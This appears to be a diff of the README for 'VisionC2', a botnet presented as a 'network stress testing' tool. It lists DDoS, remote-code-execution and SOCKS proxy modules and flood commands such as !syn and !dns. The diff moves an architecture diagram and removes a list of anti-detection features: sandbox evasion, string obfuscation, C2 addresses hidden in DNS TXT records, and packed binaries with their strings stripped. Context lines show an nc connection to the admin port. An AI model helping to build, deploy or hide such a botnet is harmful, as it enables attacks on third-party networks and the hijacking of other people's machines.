@@ -8,6 +8,7 @@
 **VisionC2** 
 *is an advanced cross-arch botnet focused on network stress testing it features end-to-end TLS 1.3 encryption, anti-analysis techniques, and DDOS/RCE/SOCKS modules. Vision is built to be setup via setup script meaning there are no code changes required.*
 
+
 ## 📋 Changelog
 
 ### v3.3 - January 2026
@@ -153,28 +154,6 @@ nc YOUR_IP YOUR_ADMIN_PORT
 # Bot binaries ready in: bot/bins/
 optional: protect UPX packed binaries from string analysis https://github.com/Syn2Much/upx-stripper
 ```
-
----
-
-## 🏗️ Architecture Overview
-
-VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:
-
-```
-┌─────────────────┐    TLS 1.3    ┌─────────────────┐
-│   Admin Console │◄──────────────►│    C2 Server    │
-│  (Multi-User)   │                │  (Go Backend)   │
-└─────────────────┘                └─────────────────┘
-                                         │ TLS 1.3
-                                         ▼
-┌─────────────────┐                ┌─────────────────┐
-│   Bot Agents    │◄───────────────┤  Bot Registry   │
-│ (14+ Architectures)│                │ & Management   │
-└─────────────────┘                └─────────────────┘
-```
-
----
-
 ## 🛠️ Command Reference
 
 ### User Management
@@ -211,25 +190,27 @@ VisionC2 operates on a client-server model with clear separation between adminis
 - `!syn/!ack/!gre/!dns` - Protocol-specific attacks
 
 ---
+---
 
-## 🔐 Security
+## 🏗️ Architecture Overview
 
-- **TLS 1.3**: Encrypted communications for all network traffic
-- **HMAC challenge-response auth**: Secure authentication mechanism
-- **Multi-Layer C2 Obfuscation**: RC4 + XOR + byte substitution + MD5 checksum verification
-- **DNS TXT Record Lookups**: C2 address can be hidden in DNS TXT records with DoH fallback
-- **UPX compressed binaries**: Executable compression and protection
-- **Multi-tier user roles**: Granular access control system
+VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:
 
-### 🛡️ **Advanced Anti-Detection**
-
-- **Sandbox Evasion**: Multi-stage detection of virtualized environments
-- **String Obfuscation**: Critical strings are hidden from static analysis
-- **Binary Protection**: UPX compression with string removal techniques
-- **Unique Crypt Seeds**: Each deployment gets unique obfuscation keys
-- **Bot Killer/Watchdog**: (WIP)
+```
+┌─────────────────┐    TLS 1.3    ┌─────────────────┐
+│   Admin Console │◄──────────────►│    C2 Server    │
+│  (Multi-User)   │                │  (Go Backend)   │
+└─────────────────┘                └─────────────────┘
+                                         │ TLS 1.3
+                                         ▼
+┌─────────────────┐                ┌─────────────────┐
+│   Bot Agents    │◄───────────────┤  Bot Registry   │
+│ (14+ Architectures)│                │ & Management   │
+└─────────────────┘                └─────────────────┘
+```
 
 ---
+
 
 ## ⚖️ Disclaimer
 
